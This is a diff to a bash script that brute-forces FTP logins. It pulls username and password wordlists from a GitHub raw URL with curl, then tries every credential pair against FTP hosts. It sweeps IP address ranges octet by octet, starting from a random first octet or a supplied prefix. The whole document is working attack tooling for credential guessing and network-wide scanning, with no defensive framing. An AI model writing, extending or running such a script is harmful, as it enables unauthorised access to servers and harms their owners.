@@ -1,9 +1,39 @@
 #!/bin/bash
+ADDRESS="192.168.0.0"
 
-function force {
-	userdict="./.u$2"
-	passdict="./.p$2"
-	echo "directories: $userdict $passdict"
+function gen4 {
+	if [ $# -eq 5 ];then
+		dict $(echo "${1}.${2}.${3}.${4}") $5
+	else
+		for k in $(seq 1 255); do #4th octet
+			dict $(echo "${1}.${2}.${3}.${k}") $4
+		done
+	fi
+}
+
+function gen3 {
+	for k in $(seq 1 255); do #3rd octet
+		gen4 $1 $2 $k $3
+	done
+}
+
+function gen2 {
+        for k in $(seq 1 255); do #2nd octet
+                gen3 $1 $k $2
+        done
+}
+
+function gen1 {
+        for k in $(seq 1 255); do #1st octet
+                gen2 $k $1
+        done
+}
+
+
+function dict {
+	userdict=".u$2"
+	passdict=".p$2"
+
 	for user in `cat $userdict`; do
 		for pass in `cat $passdict`; do
 			result=$(ftp -in "$1" <<-EOF
@@ -11,7 +41,6 @@ function force {
 				quit
 				EOF
 				)
-			exit 0
 			if [ "$result" = "Not connected." ]; then
 				return 0
 			elif [ "$result" != "Login incorrect." ]; then
@@ -23,22 +52,51 @@ function force {
 }
 
 randomname=$RANDOM
-curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/userdict > ./.u$randomname
-curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/passdict > ./.p$randomname
+curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/userdict > ".u$randomname"
+curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/passdict > ".p$randomname"
 
-r=$(($RANDOM%249)) #1st octet
-if [ $r -ne 127 ]; then
-	for i in $(seq 0 255); do #2nd octet
-		for j in $(seq 0 255); do #3rd octet
-			if [ $r -eq 192 ]; then
-				force $(echo "192.168.${i}.${j}") $randomname
-			else
-        			for k in $(seq 1 255); do #4th octet
-        				force $(echo "192.${i}.${j}.${k}") $randomname
-				done
-			fi
-		done
+count=0
+
+if [ "$ADDRESS" = false ]; then
+	addr=( $(($RANDOM%249)) )
+	count=1
+else
+	addr=($(echo $ADDRESS | cut -d "." -f 1)
+		$(echo $ADDRESS | cut -d "." -f 2)
+		$(echo $ADDRESS | cut -d "." -f 3)
+		$(echo $ADDRESS | cut -d "." -f 4))
+
+	for i in $(seq 0 3); do
+		if [ "${addr[$i]}" -ne 0 ]; then
+			count=$(($i + 1))
+		fi
 	done
 fi
 
-rm ./.u$randomname ./.p$randomname
+case "$count" in
+	"0")
+		echo "0; ${addr[*]}"
+		gen1 $randomname
+	;;
+	"1")
+                echo "1; ${addr[*]}"
+		gen2 ${addr[0]} $randomname
+	;;
+        "2")
+                echo "2; ${addr[*]}"
+                gen3 ${addr[0]} ${addr[1]} $randomname
+        ;;
+        "3")
+                echo "3; ${addr[*]}"
+                gen4 ${addr[0]} ${addr[1]} ${addr[2]} $randomname
+        ;;
+        "4")
+                echo "4; ${addr[*]}"
+                gen4 ${addr[0]} ${addr[1]} ${addr[2]} ${addr[3]} $randomname
+        ;;
+	*)
+		exit 1
+	;;
+esac
+
+rm .u* .p*
